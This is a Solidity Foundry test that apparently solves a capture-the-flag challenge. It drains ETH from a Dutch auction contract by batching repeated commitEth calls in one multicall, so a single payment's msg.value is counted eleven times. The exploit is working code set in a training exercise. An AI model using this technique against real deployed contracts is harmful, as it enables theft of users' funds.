// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {Token} from "src/other/Token.sol";
import {DutchAuction} from "src/extractoor/DutchAuction.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    Token farm;
    DutchAuction dutchAuction;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token + core contract
        vm.prank(admin);
        farm = new Token('FARM','FARM');

        vm.prank(admin);
        farm.mint(admin,1_000_000e18);

        vm.prank(admin);
        dutchAuction = new DutchAuction();

        // -- initialize auction
        vm.prank(admin);
        farm.approve(address(dutchAuction),1_000_000e18);

        vm.prank(admin);
        dutchAuction.initAuction(
            admin,
            address(farm),
            1_000_000e18,
            block.timestamp+0,
            block.timestamp+100,
            1e18/1_000, // start_price: 0.001 ETH per FARM token
            1e18/2_000, // min_price: 0.0005 ETH per FARM token
            payable(admin)
        );

        // --adminUser buying into auction w/ 900 ETH
        vm.prank(adminUser);
        dutchAuction.commitEth{value:900e18}(payable(adminUser));

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        bytes memory singleCall = abi.encodeWithSignature("commitEth(address)",attacker);
        bytes[] memory data = new bytes[](11);

        for (uint i; i<11; ++i) {
            data[i] = singleCall;
        }

        bytes memory multiCall = abi.encodeWithSignature("multicall(bytes[])",data);
        address(dutchAuction).call{value:98e18}(multiCall);

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker drains >= 90% ETH from contract
        assertLe(address(dutchAuction).balance,90e18);
        assertGe(attacker.balance,10_000e18+810e18);

    }

}